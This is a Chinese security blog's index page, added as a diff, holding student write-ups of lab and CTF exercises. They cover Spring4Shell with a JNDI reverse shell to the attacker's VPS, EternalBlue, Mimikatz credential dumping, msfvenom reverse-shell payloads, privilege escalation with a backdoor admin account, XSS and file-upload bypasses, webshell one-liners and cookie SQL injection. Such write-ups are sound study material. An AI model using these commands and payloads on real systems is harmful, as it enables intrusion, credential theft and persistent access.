@@ -1,0 +1,227 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta property="og:type" content="website">
+<meta property="og:title" content="佳木禾">
+<meta property="og:url" content="http://jiamuhe.github.io/index.html">
+<meta property="og:site_name" content="佳木禾">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="jiamuhe">
+<meta name="twitter:card" content="summary"><title>佳木禾</title><link ref="canonical" href="http://jiamuhe.github.io/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.1.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">佳木禾</div><div class="header-banner-info__subtitle">欢迎来到我的博客</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/06/24/%E5%AE%9E%E9%AA%8C%E4%BA%8C/">实验二</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-06-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-06-24</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>信息搜集<br>拿到 IP 对它进行常规的端口扫描（先通过nmap进行主机扫描再进行端口扫码）:<br>nmap -sP 192.168.1.0&#x2F;24<br><img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.1.jpg"><br>nmap -v -Pn -T3 -sV -n -sT –open -p 1-60000 192.168.1.101<br>发现了开放了端口 38080和22：<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.2.jpg"><br>是一台 Ubantu ，可疑的是这个 38080 端口，访问发现是一个Web页面：<br>所以我们直接浏览器访问（建议最好使用火狐浏览器）<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.3.jpg"><br>通过百度Whitelabel Error Page This application has no explicit mapping for &#x2F;error解决方案得知是springboot,于是尝试最近爆出的新漏洞 CVE-2022-22965 尝试看看能不能获取到 dnslog：（原理不赘述了，也是看着老师这样做的）<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.4.jpg"><br>发现存在 CVE-2022-22965 漏洞，得想办法拿到一个 Shell。<br>CVE-2022-22965 Attack<br>首先红队人员的 VPS Kali（192.168.1.103）利用漏洞利用工具生成命令LDAP：<br>java -jar JNDI-Injection-Exploit-1.0-SN APSHOT-all.jar -C “bash -c {echo,base64编码后的命令}|{base64,-d}|{bash,-i}” -A “192.168.1.103”<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.5.jpg"><br>然后红队人员的 VPS Kali（192.168.1.103）使用 nc 监听端口 8001:<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.6.jpg"><br>最后使用 EXP 成功反弹 Shell ：<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.7.jpg"><br>成功收到反弹的shell<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.8.jpg"><br>发现当前拿到的 Shell 是一个 Docker 环境：<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.9.jpg"><br>想办法逃逸发现均失败了，最后是在 &#x2F;root&#x2F; 目录下找到了 Flag 文件：<br>flag{redteam.lab-1}</p>
+<p>Congratulations, you got this: saul Saul123<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.10.jpg"><br>得到了一个类似于账号密码的东西，因为刚刚使用 Nmap 扫描出来了一个 SSH 服务，会不会这个就是账号密码呢？<br>内网初步信息搜集<br>尝试使用得到的账号密码登陆 SSH 发现登陆成功：<br>ssh <span class="exturl"><a class="exturl__link"   href="mailto:&#115;&#97;&#117;&#x6c;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#x31;&#x2e;&#49;&#48;&#x33;" >&#115;&#97;&#117;&#x6c;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#x31;&#x2e;&#49;&#48;&#x33;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.11.jpg"><br>通过信息搜集ifconfig发现当前机器是有两个网卡：<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.12.jpg"><br>其中 ens33 是外网的网卡，ens38 （10.0.1.6）是内网网卡，猜测有内网！<br>所以我们用 for 循环 ping 一下 ens38 的 C 段：<br>for i in 10.0.1.{1..254}; do if ping -c 3 -w 3 $i &amp;&gt;&#x2F;dev&#x2F;null; then echo $i Find the target; fi; done<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.13.jpg"><br>发现内网还有一台主机存活：10.0.1.7<br>随后为了方便，我选择用 frp 把当前机器的流量代理出来：<br>代理过程<br>修改kail中的配置文件<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.14.jpg"><br>修改Ubuntu的配置文件<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.15.jpg"><br>现在kail上执行sudo .&#x2F;frps -c frps.ini<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.16.jpg"><br>之后在Ubuntu执行.&#x2F;frpc -c frpc.ini<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.17.jpg"><br>接下来我们打开msf设置反向代理<br>msf6 &gt; setg Proxies socks5:192.168.1.103:1088<br>msf6 &gt; setg ReverseAllowProxy true<br>然后使用 Metasploit 设置 Socks 对内网进行深度信息搜集；<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.18.jpg"><br>使用 smb 版本探测模块对目标进行扫描：<br>use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.19.jpg"><br>发现目标 10.0.1.7 版本是 Windows 7，且存在域 REDTEAM。<br>既然是 Win7，那么是不是应该存在 MS17-010 呢？<br>MS17-010 Attack<br>探测发现存在MS17-010漏洞（永恒之蓝）：<br>use auxiliary&#x2F;sanner&#x2F;smb&#x2F;smb_ms17_010<br>show options<br>set PHOSTS 10.0.1.7<br>run<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.20.jpg"><br>利用这个漏洞发现利用漏洞失败<br>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue<br>show options<br>set PHOSTS 10.0.1.7<br>run<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.21.jpg"><br>由于目标是内网不一定出网，随后我使用正向 bind 让kali直接连过去：</p>
+<p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp<br>run</p>
+<p>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp<br>payload&#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; show options </p>
+<p>Module options (exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue):</p>
+<p>   Name           Current Setting  Required  Description</p>
+<hr>
+<p>   RHOSTS         10.0.1.7         yes       The target host(s), range CIDR identifier, or hosts file with syntax ‘file:<path>‘<br>   RPORT          445              yes       The target port (TCP)<br>   SMBDomain      .                no        (Optional) The Windows domain to use for authentication<br>   SMBPass                         no        (Optional) The password for the specified username<br>   SMBUser                         no        (Optional) The username to authenticate as<br>   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.<br>   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</p>
+<p>Payload options (windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp):</p>
+<p>   Name      Current Setting  Required  Description</p>
+<hr>
+<p>   EXITFUNC  thread           yes       Exit technique (Accepted: ‘’, seh, thread, process, none)<br>   LPORT     4444             yes       The listen port<br>   RHOST     10.0.1.7         no        The target address</p>
+<p>Exploit target:</p>
+<p>   Id  Name</p>
+<hr>
+<p>   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</p>
+<p>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt;run<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.22.jpg"><br>(此时我们已经拿到了system权限了，可以通过meterpreter &gt; sysinfo查看系统信息发现域环境, meterpreter &gt; getuid查看当前权限，如果是Administrator权限可以通过getsystem命令尝试自动提权,这里我们就不再赘述了)</p>
+<p>拿到 Win7 权限后加载 Mimikatz 抓到一个明文密码：<br>（这里需要注意的是，如果win7是重新启动没有进行登录过的话系统里面是不会存有用户登录的凭据的，所以这里需要在win7系统上对root账号进行登录一次）</p>
+<p>Username  Domain   Password</p>
+<hr>
+<p>root      REDTEAM  Red12345</p>
+<p> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.23.jpg"><br>这个时候得到了一个域用户账号。<br>内网渗透之内核漏洞 - CVE-2021-42287、CVE-2021-42278<br>通过对当前内网进行信息搜集发现当前 Win7 机器还有一个内网网卡：<br>（也可以通过meterpreter拿到一个shell，然后ipconfig）<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.24.jpg"><br>通过下面命令定位到域控到域控 IP 为 10.0.0.12 :(也可以直接ping DC)<br>net group “domain controllers” &#x2F;domain<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.25.jpg"><br>这里尝试使用最近爆出的两个域内内核漏洞：<br>CVE-2021-42287、CVE-2021-42278<br>（注：这两个漏洞是什么不重要，也不太清楚原理哈，也是看着文件有这个东西，百度了下确实是接下来操作的原理，这里就不再赘述了。没弄懂也没没关系，不影响接下来的操作）<br>meterpreter &gt; background把会话放在后台<br>使用 MSF 添加了一个 Socks：<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.26.jpg"><br>添加之后返回之前那个会话<br>通过msf6 auxiliary(server&#x2F;socks_proxy) &gt; sessions查看之前有哪个会话<br>msf6 auxiliary(server&#x2F;socks_proxy) &gt; sessions 1切换到之前的会话<br>meterpreter然后添加路由：<br>run autoroute -s 10.0.0.7&#x2F;24<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.27.jpg"><br>由于是 socks5 协议，我本地修改了配置文件然后直接利用脚本：<br>python3 sam_the_admin.py “redteam&#x2F;root:Red12345” -dc-ip 10.0.0.12 -shell<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.28.jpg"><br>最后也是拿到了最终的 Flag。<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%BA%8C/0624.29.jpg"><br>最终完成了本次靶场通关考核</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/06/21/%E5%AE%9E%E9%AA%8C1/">实验1</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-06-21</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-06-24</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>扫描IP<br>使用Ettercap进行扫描IP（推荐使用nmap,但是这里扫出来太多就不使用了）<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.1.jpg"><br>文件上传位置<br>使用Burpsuite打开网址，发现界面如下<br>  <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.2.jpg"><br>在点击完UserCenter后发现到了一个登录界面，发现他是有验证码的。就不好进行爆破了。经历猜密码失败后，尝试注册一个账户看看。<br> <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.3.jpg"></p>
+<p>我们发现这是一个管理员后台（密码大概率就是admin123） 后来发现原来这个是可以直接问老师管理员密码的，这个就尴尬了，班上也确实没人问嗷，确实也是可以直接利用漏洞做出来的<br>  <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.4.jpg"><br>登录后发现了一个做“站点模板管理”就很熟悉。我们尝试把webshell打成压缩包进行上传。（注意webshell的格式，这个网站的后缀都是aspx所以一定要用蚁剑生成aspx的shell，不然传上php也没用）<br>  <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.5.jpg"><br>经过寻找后这里有个站点文件管理，可以直接找到上传的shell1和shell2，换完shell成功登录。<br>  <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.6.jpg"></p>
+<p>提权与获取密码<br>利用虚拟终端发现权限是nt authority\network service，进行提权处理。<br>利用msf生成木马<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;kail的<br>ip地址 LPORT&#x3D;4444 -f exe -o hackshell.exe<br>通过webshell将这个木马上传，然后开启msf的监听<br>msfconsole；use exploit&#x2F;multi&#x2F;handle；SET LHOST kail的IP；SET PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp；exploit；<br>依次执行上面的命令，然后就开启了监听。<br>通过webshell的虚拟终端，输入hackshell.exe启动木马<br>发现kail有回显。<br>  <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.7.jpg"><br>在这里我们使用烂土豆进行提权<br>我们先use incognito调用一些命令，<br>通过list_tokens -u看一下有哪些令牌。<br>  <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.8.jpg"><br>运行烂土豆<br>execute -c -H -f .&#x2F;potato.exe<br>  <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.9.jpg"><br>再次查看令牌，system出来了<br>直接模仿impersonate_token “NT AUTHORITY\SYSTEM”<br>  <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.10.jpg"><br>getuid后发现，已经是SYSTEM权限了<br>输入shell，进入cmd<br>使用net user mybb 123@qwe&#x2F;add创建一个为mybb密码为123@qwe的用户(密码为123@qwe比较简单，密码设置这个不重要)<br>  <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.11.jpg"><br>net user 看一下新建的账户<br>net localgroup administrators mybb &#x2F;add 把新建的用户变成管理员。<br>输入exit从cmd退出来<br>输入run getgui -e开启3389端口。进行远程连接<br>然后直接通过msf输入hashdump 拿到hash<br>  <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.12.jpg"><br>得出密文部分是afffeba176210fad4628f0524bfe1942，上网cmd5解密。直接得出密码为123.com<br>  <img src="/picture/%E5%AE%9E%E9%AA%8C%E4%B8%80/220621.13.jpg"><br>好像是这个密码才是可以问的来着，也就是最终答案，看来之前我是纯猜对了的</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/22/xsslabs/">xsslabs</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-22</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>level1<br>第一关相对来说简单，看到上面有个name&#x3D;。所以我们把后面改成语句测试。成功</p>
+<p><img src="/picture/xxs1.jpg"></p>
+<p>Level2<br>第二关，我们直接在输入框输入后行不通。右键看一下网页代码</p>
+<p>我们会发现，我们输入的标点变成了 实体码，他这里是用了一个函数。我没只需要把这个函数闭合掉就行了</p>
+<p>闭合的方式从这里找</p>
+<script>alert('a')</script>
+<p>他后面比咱输入的多了一个”&gt;很明显了</p>
+<p><img src="/picture/xxs2.1.jpg"></p>
+<p><img src="/picture/xxs2.2.jpg"></p>
+<p>level3<br>这个题就有点离谱了。他没有办法用&gt;去闭合掉那么只能换一个方式。我们用点击弹窗的方式输入’onclick&#x3D;’alert(‘a’)这两个单引号都属为了去闭合。</p>
+<p><img src="/picture/xxs3.jpg"></p>
+<p>level4<br>我们直接用onclick来进行测试。毕竟它比较短。不行我们就右键看网页代码。发现他只是换成了双引号进行闭合</p>
+<p><img src="/picture/xxs4.jpg"></p>
+<p>level5<br>我们测试后会发现，on变成了o_n不能用了。想大写绕，绕不过去，那我们再换一个方法，超链接<img src="/picture/xxs5.jpg"></p>
+<p>我们再次拿捏</p>
+<p>level6<br>我还是用那个短的测试。发现又把on变了，我们继续尝试大写。成功</p>
+<p><img src="/picture/xxs6.jpg"></p>
+<p>level7<br>继续测试、右键。发现on没了。那么我们尝试双写绕过。成功</p>
+<p><img src="/picture/xxs7.jpg"></p>
+<p>level8<br>这个是把你写的内容放到下面的连接里。我们直接尝试javascript:alert(1)发现script被处理了。</p>
+<p>我们尝试大写，他会自己变小。那我们通过转码进行绕过。<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tool.oschina.net/encode" >https://tool.oschina.net/encode</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>转码后直接拿下。</p>
+<p><img src="/picture/xxs8.jpg"></p>
+<p>level9<br>根据经验，直接偷鸡，先把上一个的代码偷过来用一下。</p>
+<p>变成了一个非常离谱的东西。右键它告诉我们链接不合法。那我们如果是一个百度的链接呢，他还是不合法。但当把https改成http后合法了。说明它合法与否就是检测有没有http:&#x2F;&#x2F;</p>
+<p>但是当我们输入&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;http:&#x2F;&#x2F;时直接无法跳转。这都是http惹的祸，只要把它注释掉就好了</p>
+<p><img src="/picture/xxs9.jpg"></p>
+<p>level10<br>这个更…</p>
+<p>我们直接看啥都没有。就那一个破地址栏用烂了都没反应</p>
+<p>F12查看一下</p>
+<p><img src="/picture/xxs10.1.jpg"></p>
+<p>这里藏仨东西受得了受不了啊</p>
+<p>我们从这三个下手。我的原则就是挑短的。按照132来。第一个没反应。</p>
+<p>那个引号还是用来闭合的。毕竟，如果是内容的话语句就没用了，就是单纯的句子了</p>
+<p><img src="/picture/xxs10,2.jpg"></p>
+<p>level11<br>发现，这个东西他又多了一个ref的隐藏。里面的内容是上一个题的链接。当我们尝试改变他的时候，他就会变成空的。</p>
+<p>我们需要把他抓包，才有可能改变它</p>
+<p>如果刚开始抓能抓到refererr，后来在抓就得自己加。当我们把抓到包里添加referer时，网页上的这个表情终于拿到了参数值。我们只需要把代码放在这里就好了</p>
+<p>referer:”onclick&#x3D;”alert(‘a’)</p>
+<p><img src="/picture/xxs11.jpg"></p>
+<p>level12<br>又多了一个，咱吸取经验直接抓包</p>
+<p>抓包后直接改。轻松秒杀</p>
+<p><img src="/picture/xxs12.jpg"></p>
+<p>level13<br>cook盲猜一下肯定是cookie</p>
+<p>我们在cookie后面添加语句</p>
+<p><img src="/picture/xxs13.jpg"></p>
+<p>level14<br>level15<br>ng-include 和之前文件上传中的include是差不多的</p>
+<p>14和15这俩题都有点毛病<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://158.247.233.5:25024/level15.php?src=1.gif%E6%8C%89%E7%90%86%E8%AF%B4%E4%BB%96%E5%BA%94%E8%AF%A5%E9%95%BF%E6%88%90%E8%BF%99%E6%A0%B7" >http://158.247.233.5:25024/level15.php?src=1.gif按理说他应该长成这样</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>src的值会传到 ng-include后面</p>
+<p>直接包含第一关?src&#x3D;’level1.php?name&#x3D;‘</p>
+<p><img src="/picture/xxs15.jpg"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/22/upload-labs/">upload-labs</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-22</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>upload -1<br><img src="/picture/up1.jpg"></p>
+<p>弹窗现实不允许上传，说明这个的限制是出现在前端。禁用浏览器的JavaScript即可</p>
+<p>upload-2<br>先看提示：MIME检查</p>
+<p>那么我们直接文件改名为shell.png</p>
+<p>上传抓包，把框中文件名改为：shell.php</p>
+<p><img src="/picture/up2.jpg"></p>
+<p>使用蚁剑进行连接即可</p>
+<p>upload-3<br>本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</p>
+<p>此题是利用黑名单进行过滤，只要使用这些禁止的之外就行。例如有phtml，php3，pht，phps</p>
+<p>upload-4<br>这题相对来说，步骤多一些。他禁止了一堆后缀名。</p>
+<p>我们可以通过上传一个.htaccess配置文件， SetHandler application&#x2F;x-httpd-php 这句话的意思是：把所有文件都看着php来用</p>
+<p>并抓包。抓包后，必须将.前面的全部删除，才能用</p>
+<p><img src="/picture/up4.jpg"></p>
+<p>之后上传png格式的shell文件就行了</p>
+<p>upload-5<br>我们直接研究一下源代码，在源代码中没有把文件名转化为小写这行代码。所以我们只要通过大小写就可以绕过他的检验</p>
+<p>上传shell.Php即可</p>
+<p><img src="/picture/up5.jpg"></p>
+<p>upload-6<br>通过观看源代码发现，没有去除空格。所以我们通过上传时抓包，在文件名后面加上一个空格，即可绕过，</p>
+<p>但是由于靶场不是windows系统，所以没有作用。</p>
+<p>按道理，如果是windows系统，最后的空格系统会自动去掉。但这个靶场的环境不行</p>
+<p>在windows靶场中，成功</p>
+<p>upload-7<br>抓包，把文件名改为shell.php.即可</p>
+<p>upload-8<br>在源代码中没用过滤::$data。这个东西在windows系统里会直接过滤掉。</p>
+<p>所以我们抓包，在.php后面添加::$data即可。还是需要windows环境，这个靶场不行</p>
+<p>upload-9<br>可抓包后在文件末尾加上. .因为他只去除了一个.一个空格。</p>
+<p>upload-10<br>根据源码分析，是把黑名单里面的替换成空。</p>
+<p>那么我们只需要双写即可。蚁剑轻松连接</p>
+<p>upload-11<br>这个根据提示是位置可控。</p>
+<p>我们只需要把要上传的shell后缀改为白名单中的一种，然后上传时抓包。把位置改为&#x2F;upload&#x2F;shell.php%00即可</p>
+<p>但是这个%00截断只能在php5.3以下才有用，所以这个靶场不支持</p>
+<p>upload-12<br>和上题几乎相同，区别在于传递方式不一样。我们只需要右击%00然后进行url编码即可，或者之前去改16进制也行</p>
+<p><img src="/picture/up12.jpg"></p>
+<p>upload-13、14、15<br>我们可以先使用copy shell.png &#x2F;b +shell.php &#x2F;a webshell.png 生成一个图片马，也可以抓包然后把shell写进去</p>
+<p>把图片马上传，然后利用文件包含漏洞访问&#x2F;include.php?file&#x3D;upload&#x2F;9320220413085029.gif</p>
+<p>之后用蚁剑连接这个文件包含的连接即可</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-22</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>a</p>
+<p>webshell分类：</p>
+<p>​ 一句话木马：代码量小，需要和webshell管理工具配合使用；</p>
+<p>​ php： &lt;?php @assert($_POST[_];?)&gt;</p>
+<p>@屏蔽错误</p>
+<p>eval() php函数，解析字符串类型的php代码</p>
+<p>$</p>
+<p>​ asp:&lt;%eval request(“k”)%&gt;</p>
+<p>aspx:</p>
+<p>jsp:</p>
+<p>小马：功能单一（文件上传、命令执行等），通常和大马结合使用</p>
+<p>大妈：功能较多，代码量大，隐蔽性查，常见功能有文件管理、虚拟终端、数据库管理、提权、信息收集等</p>
+<p>内存马：扩展（php+。.net+java+python等）</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/01/SQLI-DUMB-SERIES-20/">SQLI-DUMB-SERIES-20</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-01</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><img src="/picture/20.1.jpg"><br>提示过于明显，直接去和cookie battle一下</p>
+<p>抓包，我i们得找他的GET包，因为他的post包还没生成cookie呢。</p>
+<p>加单引号，发现可以还是挺良心得</p>
+<p><img src="/picture/20.2.jpg"></p>
+<p>Cookie: uname&#x3D;admin’ and updatexml(0x3e,concat(0x3a,database()),0x3a) %23</p>
+<p><img src="/picture/20.3.jpg"></p>
+<p>后续步骤仍是枯燥无味得重复</p>
+<p>Cookie: uname&#x3D;admin’ and updatexml(0x3e,concat(0x3a,(select table_name from information_schema.tables where table_schema&#x3D;database()limit 3,1)),0x3a) %23</p>
+<p><img src="/picture/20.4.jpg"></p>
+<p>Cookie: uname&#x3D;admin’ and updatexml(0x3e,concat(0x3a,(select column_name from information_schema.columns where table_name&#x3D;’users’limit 2,1)),0x3a) %23</p>
+<p><img src="/picture/20.5.jpg"></p>
+<p>Cookie: uname&#x3D;admin’ and updatexml(0x3e,concat(0x3a,(select password from users where id&#x3D;’8’)),0x3a) %23</p>
+<p><img src="/picture/20.6.jpg"></p>
+<p>密码又一次跑了出来(⓿_⓿)</p>
